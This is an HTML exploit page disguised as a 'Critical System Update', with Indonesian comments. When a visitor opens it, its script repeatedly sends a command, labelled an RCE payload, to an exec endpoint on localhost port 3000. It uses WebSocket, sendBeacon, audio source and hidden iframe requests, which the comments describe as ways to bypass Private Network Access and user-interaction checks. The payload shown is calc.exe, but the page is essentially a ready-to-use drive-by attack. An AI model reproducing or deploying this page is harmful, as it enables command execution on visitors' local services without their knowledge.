<!DOCTYPE html>
<html>
<head>
    <title>Critical System Update</title>
</head>
<body style="background:#000; color:#0f0; font-family:monospace; text-align:center;">
    <h1>INITIALIZING SECURE PROTOCOL...</h1>
    <div id="l"></div>

    <script>
        const log = (m) => document.getElementById('l').innerHTML += `> ${m}<br>`;
        
        // Payload RCE yang lebih mematikan (Silently execute)
        const cmd = "calc.exe"; 

        async function startChain() {
            log("Phase 1: Bypassing PNA via WebSocket Shadowing...");
            
            const hosts = ["127.0.0.1", "0.0.0.0", "[::1]"];
            
            hosts.forEach(ip => {
                // Teknik 1: WebSocket Shadowing (Bypass PNA Preflight)
                try {
                    let ws = new WebSocket(`ws://${ip}:3000`);
                    ws.onopen = () => {
                        ws.send(cmd);
                        log(`[!] PNA Boundary Breached on ${ip}`);
                    };
                } catch(e){}

                // Teknik 2: Persistent Subresource Fetch (Bypass Mixed Content via 'No-Config')
                // Menggunakan ping/sendBeacon seringkali lolos dari Mixed Content filter
                navigator.sendBeacon(`http://${ip}:3000/exec?cmd=${encodeURIComponent(cmd)}`);

                // Teknik 3: Audio Context Request (Bypass User Interaction)
                // Beberapa browser mengizinkan 'low-level' socket via audio/video pre-fetch
                let a = new Audio();
                a.src = `http://${ip}:3000/exec?cmd=${encodeURIComponent(cmd)}`;
            });

            // Teknik 4: Iframe 'Self-Flipping' (Force Navigation)
            // Memaksa browser melakukan 'Top-level' request tanpa prompt
            const ifr = document.createElement('iframe');
            ifr.src = `http://127.0.0.1:3000/exec?cmd=${encodeURIComponent(cmd)}`;
            ifr.style.display = "none";
            document.body.appendChild(ifr);
        }

        // AUTO-START: Mencoba Zero-Click
        // Jika auto-start diblokir, script akan menunggu 1 detik lalu mencoba lagi
        window.onload = () => {
            log("Chain sequence started...");
            startChain();
            // Loop serangan setiap 5 detik untuk memastikan persistensi
            setInterval(startChain, 5000);
        };
    </script>
</body>
</html>
